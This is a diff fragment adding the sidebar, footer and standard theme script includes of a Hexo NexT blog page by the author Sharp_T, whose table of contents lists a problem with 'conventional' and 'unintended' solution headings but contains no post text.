+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/uploads/avatar.png"
+                alt="Sharp_T" />
+            
+              <p class="site-author-name" itemprop="name">Sharp_T</p>
+              <p class="site-description motion-element" itemprop="description">人间万事消磨尽</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.vkxss.top/" title="VK" target="_blank">VK</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目"><span class="nav-number">1.</span> <span class="nav-text">题目</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#常规解法"><span class="nav-number">1.0.1.</span> <span class="nav-text">常规解法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#非预期解法"><span class="nav-number">1.0.2.</span> <span class="nav-text">非预期解法</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Sharp_T</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
